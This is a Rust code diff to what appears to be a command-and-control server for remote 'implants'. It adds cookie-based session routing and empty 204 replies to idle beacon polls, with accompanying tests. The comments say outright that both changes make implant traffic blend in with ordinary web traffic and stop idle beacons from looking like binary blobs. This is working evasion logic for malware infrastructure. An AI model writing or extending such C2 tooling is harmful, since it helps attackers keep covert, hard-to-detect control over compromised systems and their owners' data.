@@ -381,19 +381,53 @@ fn request_allowed(method: &str, uri: &str, profile: &Profile) -> bool {
     method == "POST" && profile.uris.iter().any(|allowed| allowed == uri)
 }
 
-fn session_token_of(req: &HttpRequest) -> Option<u64> {
-    std::str::from_utf8(req.header(HDR_SESSION)?)
-        .ok()?
-        .trim()
-        .parse()
-        .ok()
+/// Session token from the demux tag: the X-Session header (legacy) or
+/// the profile-named session cookie (T035) — a session cookie is what
+/// web-fronted traffic normally carries, a custom header is not.
+fn session_token_of(req: &HttpRequest, cookie_name: &str) -> Option<u64> {
+    if let Some(value) = req.header(HDR_SESSION) {
+        if let Some(token) = std::str::from_utf8(value)
+            .ok()
+            .and_then(|text| text.trim().parse().ok())
+        {
+            return Some(token);
+        }
+    }
+    let cookie = std::str::from_utf8(req.header("Cookie")?).ok()?;
+    for pair in cookie.split(';') {
+        if let Some((name, value)) = pair.trim().split_once('=') {
+            if name.trim() == cookie_name {
+                if let Ok(token) = value.trim().parse() {
+                    return Some(token);
+                }
+            }
+        }
+    }
+    None
 }
 
-fn is_handshake(req: &HttpRequest) -> bool {
+fn is_handshake(req: &HttpRequest, cookie_name: &str) -> bool {
     // X-Handshake marks demux-aware ClientHello POSTs; the bare
     // body-length check keeps legacy (headerless) implants working.
     matches!(req.header(HDR_HANDSHAKE), Some(v) if v == b"1")
-        || (req.body.len() == crypto::CLIENT_HELLO_LEN && session_token_of(req).is_none())
+        || (req.body.len() == crypto::CLIENT_HELLO_LEN
+            && session_token_of(req, cookie_name).is_none())
+}
+
+/// Wire behavior is gated on the implant build version: 0.2.0+ answers
+/// an empty TASK_POLL with a body-less 204 (nothing to deliver, no
+/// sealed BatchEnd — an idle poll stops looking like a binary blob);
+/// older builds still expect the sealed batch trailer and keep getting
+/// 200.
+fn implant_supports_204(version: &str) -> bool {
+    let mut it = version.split('.');
+    match (it.next(), it.next()) {
+        (Some(maj), Some(min)) => matches!(
+            (maj.parse::<u32>(), min.parse::<u32>()),
+            (Ok(major), Ok(minor)) if (major, minor) >= (0, 2)
+        ),
+        _ => false,
+    }
 }
 
 /// One origin connection. Connection-bound state is a LEGACY fallback
@@ -432,7 +466,7 @@ async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
             write_response(&mut stream, 413, &profile.server_header, b"").await?;
             anyhow::bail!("request body {} exceeds limit", req.body.len());
         }
-        if is_handshake(&req) {
+        if is_handshake(&req, &profile.cookie_name) {
             if req.body.len() != crypto::CLIENT_HELLO_LEN {
                 write_response(&mut stream, 400, &profile.server_header, b"").await?;
                 anyhow::bail!(
@@ -452,7 +486,7 @@ async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
             )
             .await?;
             let session = crypto::server_finish(secret, &client_hello, &server_hello);
-            match session_token_of(&req) {
+            match session_token_of(&req, &profile.cookie_name) {
                 // Demux-aware implant: park the keys under its token so
                 // the REGISTER finds them on any pooled connection.
                 Some(token) => {
@@ -472,7 +506,7 @@ async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
         // the token wins over the live session: it exists exactly between
         // the beacon's hello and its REGISTER, and that REGISTER is sealed
         // with the fresh keys, not the session's current ones.
-        if let Some(token) = session_token_of(&req) {
+        if let Some(token) = session_token_of(&req, &profile.cookie_name) {
             let provisional = state.provisionals.lock().unwrap().remove(&token);
             if let Some((session, _)) = provisional {
                 conn_session = register(&mut stream, &req.body, session, peer, &state, &profile)
@@ -629,6 +663,10 @@ async fn serve_session<S: AsyncWrite + Unpin>(
     };
     let mut response: Vec<u8> = Vec::new();
     let mut dirty = false;
+    // Set when the only thing this request asked was an empty poll from
+    // a 0.2.0+ implant: answer with a body-less 204 instead of a sealed
+    // BatchEnd (T035).
+    let mut empty_poll = false;
     for (msg_type, payload) in frames {
         match msg_type {
             msg::REGISTER => {
@@ -640,20 +678,23 @@ async fn serve_session<S: AsyncWrite + Unpin>(
                 live.set_seen();
                 let outbound: Vec<Message> =
                     std::mem::take(&mut *live.pending.lock().unwrap()).into();
-                for message in &outbound {
-                    if let Message::Task(task) = message {
-                        audit(
-                            state,
-                            "task_delivered",
-                            json!({
-                                "session": live.id,
-                                "task_id": task.id,
-                                "kind": task_kind_name(&task.body),
-                            }),
-                        );
+                if outbound.is_empty() {
+                    let version = { live.info.lock().unwrap().implant_version.clone() };
+                    empty_poll = implant_supports_204(&version);
+                } else {
+                    for message in &outbound {
+                        if let Message::Task(task) = message {
+                            audit(
+                                state,
+                                "task_delivered",
+                                json!({
+                                    "session": live.id,
+                                    "task_id": task.id,
+                                    "kind": task_kind_name(&task.body),
+                                }),
+                            );
+                        }
                     }
-                }
-                if !outbound.is_empty() {
                     // Delivered messages leave the persisted queue: save.
                     dirty = true;
                     for message in outbound {
@@ -661,8 +702,10 @@ async fn serve_session<S: AsyncWrite + Unpin>(
                         response.extend_from_slice(&live.seal(mt, &body)?);
                     }
                 }
-                let (mt, body) = Message::BatchEnd.encode();
-                response.extend_from_slice(&live.seal(mt, &body)?);
+                if !empty_poll {
+                    let (mt, body) = Message::BatchEnd.encode();
+                    response.extend_from_slice(&live.seal(mt, &body)?);
+                }
             }
             msg::RESULT => {
                 if let Message::TaskResult(result) = Message::decode(msg_type, &payload)? {
@@ -713,7 +756,13 @@ async fn serve_session<S: AsyncWrite + Unpin>(
             _ => {}
         }
     }
-    write_response(stream, 200, &profile.server_header, &response).await?;
+    if empty_poll && response.is_empty() {
+        // Nothing to deliver and nothing sealed: the idle poll answers
+        // 204 with no body (0.2.0+ implants treat it as an empty batch).
+        write_response(stream, 204, &profile.server_header, b"").await?;
+    } else {
+        write_response(stream, 200, &profile.server_header, &response).await?;
+    }
     if dirty {
         persist_state(state).await;
     }
@@ -1601,23 +1650,48 @@ mod tests {
         session: &mut Session,
         token: u64,
     ) -> Vec<(u8, Vec<u8>)> {
+        let (status, body) = poll_raw(stream, profile, session, token, HDR_SESSION).await;
+        assert_eq!(status, 200);
+        open_frames(&body, session).unwrap()
+    }
+
+    /// Poll returning (status, body); `tag_header` is "Cookie" or
+    /// "X-Session" so routing by cookie is testable.
+    async fn poll_raw(
+        stream: &mut DuplexStream,
+        profile: &Profile,
+        session: &mut Session,
+        token: u64,
+        tag_header: &str,
+    ) -> (u16, Vec<u8>) {
         let uri = profile.uris[0].as_str();
         let (mt, body) = Message::TaskPoll.encode();
         let frame = session.seal(mt, &body).unwrap();
+        let tag = if tag_header == "Cookie" {
+            format!("{}={}", profile.cookie_name, token)
+        } else {
+            token.to_string()
+        };
         write_request(
             stream,
             "POST",
             uri,
             "h",
             "ua",
-            &[(HDR_SESSION, &token.to_string())],
+            &[(tag_header, &tag)],
             &frame,
         )
         .await
         .unwrap();
         let resp = read_response(stream).await.unwrap();
-        assert_eq!(resp.status, 200);
-        open_frames(&resp.body, session).unwrap()
+        (resp.status, resp.body)
+    }
+
+    /// Overrides the reported implant build version of a session.
+    async fn set_implant_version(state: &AppState, token: u64, version: &str) {
+        let id = *state.tokens.read().await.get(&token).unwrap();
+        let live = state.sessions.read().await.get(&id).unwrap().clone();
+        live.info.lock().unwrap().implant_version = version.to_string();
     }
 
     fn contains_task(frames: &[(u8, Vec<u8>)], id: u32) -> bool {
@@ -1878,5 +1952,77 @@ mod tests {
         assert!(sessions.contains("\"sessions\""), "got: {sessions}");
 
         server.abort();
+    }
+
+    /// Idle polls from 0.2.0+ implants answer a body-less 204 (an idle
+    /// beacon stops looking like a constant binary blob); legacy builds
+    /// keep the sealed empty batch with 200 (T035).
+    #[tokio::test]
+    async fn empty_poll_is_204_for_new_implants_only() {
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(None, None);
+        let profile = Profile::default();
+        spawn_server(server_end, state.clone(), profile.clone());
+
+        let mut a = link(&mut client, &state, &profile, 7171).await;
+        set_implant_version(&state, 7171, "0.2.0").await;
+        let (status, body) = poll_raw(&mut client, &profile, &mut a, 7171, HDR_SESSION).await;
+        assert_eq!(status, 204);
+        assert!(body.is_empty());
+
+        let mut b = link(&mut client, &state, &profile, 7272).await;
+        set_implant_version(&state, 7272, "0.1.0").await;
+        let (status, body) = poll_raw(&mut client, &profile, &mut b, 7272, HDR_SESSION).await;
+        assert_eq!(status, 200);
+        let frames = open_frames(&body, &mut b).unwrap();
+        assert_eq!(frames.len(), 1);
+        assert_eq!(frames[0].0, msg::BATCH_END);
+
+        // A queued task still delivers as a normal 200 batch.
+        let live = {
+            let id = *state.tokens.read().await.get(&7171).unwrap();
+            state.sessions.read().await.get(&id).unwrap().clone()
+        };
+        live.pending.lock().unwrap().push_back(Message::Task(Task {
+            id: 42,
+            body: TaskBody::Sleep {
+                secs: 1,
+                jitter: 0.0,
+            },
+        }));
+        let (status, body) = poll_raw(&mut client, &profile, &mut a, 7171, HDR_SESSION).await;
+        assert_eq!(status, 200);
+        assert!(contains_task(&open_frames(&body, &mut a).unwrap(), 42));
+        // Delivered: the next idle poll is empty again -> 204.
+        let (status, _) = poll_raw(&mut client, &profile, &mut a, 7171, HDR_SESSION).await;
+        assert_eq!(status, 204);
+    }
+
+    /// The session token rides in the profile-named cookie instead of
+    /// the custom header (T035): routing must work cookie-only.
+    #[tokio::test]
+    async fn cookie_routes_the_session_token() {
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(None, None);
+        let profile = Profile::default();
+        spawn_server(server_end, state.clone(), profile.clone());
+
+        let mut a = link(&mut client, &state, &profile, 8181).await;
+        set_implant_version(&state, 8181, "test").await;
+
+        let live = {
+            let id = *state.tokens.read().await.get(&8181).unwrap();
+            state.sessions.read().await.get(&id).unwrap().clone()
+        };
+        live.pending.lock().unwrap().push_back(Message::Task(Task {
+            id: 55,
+            body: TaskBody::Sleep {
+                secs: 1,
+                jitter: 0.0,
+            },
+        }));
+        let (status, body) = poll_raw(&mut client, &profile, &mut a, 8181, "Cookie").await;
+        assert_eq!(status, 200);
+        assert!(contains_task(&open_frames(&body, &mut a).unwrap(), 55));
     }
 }
